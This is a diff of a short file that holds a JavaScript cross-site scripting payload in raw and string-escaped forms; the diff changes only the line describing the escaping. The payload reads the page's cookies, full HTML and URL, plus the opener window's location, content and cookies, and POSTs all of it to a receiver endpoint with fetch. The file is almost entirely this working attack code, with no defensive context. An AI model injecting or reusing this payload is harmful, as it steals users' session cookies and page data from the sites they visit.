@@ -5,7 +5,7 @@ javascript code:
 
 (function(){if(window.name!=='__'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS('http://www.w3.org/1999/xhtml','input');var body=document.getElementsByTagName('body')[0];__.setAttribute('value',escape(dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));fetch('http://localhost:8080/Receiver/r',{method:'POST',body:__.getAttribute('value')})}else{window.name=''}})();
 
-formated javascript code, change \ to \\ and ' to \': 
+formated javascript code, change \ to \\\\ and ' to \\': 
 
 (function(){if(window.name!==\'__\'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS(\'http://www.w3.org/1999/xhtml\',\'input\');var body=document.getElementsByTagName(\'body\')[0];__.setAttribute(\'value\',escape(dcoo+\'\\r\\n\\r\\n\'+inne+\'\\r\\n\\r\\n\'+durl+\'\\r\\n\\r\\n\'+oloc+\'\\r\\n\\r\\n\'+oloh+\'\\r\\n\\r\\n\'+odoc));fetch(\'http://localhost:8080/Receiver/r\',{method:\'POST\',body:__.getAttribute(\'value\')})}else{window.name=\'\'}})();
 
